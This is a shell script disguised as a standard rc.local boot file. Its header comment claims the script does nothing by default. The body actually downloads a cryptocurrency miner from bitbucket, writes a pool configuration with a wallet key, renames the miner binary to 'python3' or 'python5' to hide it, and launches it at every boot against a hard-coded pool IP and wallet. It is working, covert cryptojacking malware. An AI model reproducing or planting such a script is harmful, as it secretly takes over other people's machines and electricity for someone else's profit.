#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/python5 ]; then
    if pgrep -x "python5" > /dev/null
then
    echo "Miner dang chay roi , ke cmn di "
    
else

echo "Miner da install , chay thoi "
./python5 -o 42.119.159.78:80 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x

     
fi
exit
fi


set -x #echo on

wget https://bitbucket.org/cryptogone/ariocppminer/downloads/ariocppminer_v0.9.8_ubuntu16_server.tar.gz
tar -zxf ariocppminer_v0.9.8_ubuntu16_server.tar.gz
echo "pool
http://aropool.com/
y2nNWENYMvLRiyfRXf1Hf2JCrKMVMyvzL38CTQgMPrEAohWn8RSYkpRjvxvwELepeBrEpa1pwJQSRtnKWfb746C
`nproc`
enhanced
true
`hostname`" > config.cfg
mv ariocppminer_avx2 python3
./python3

exit 0
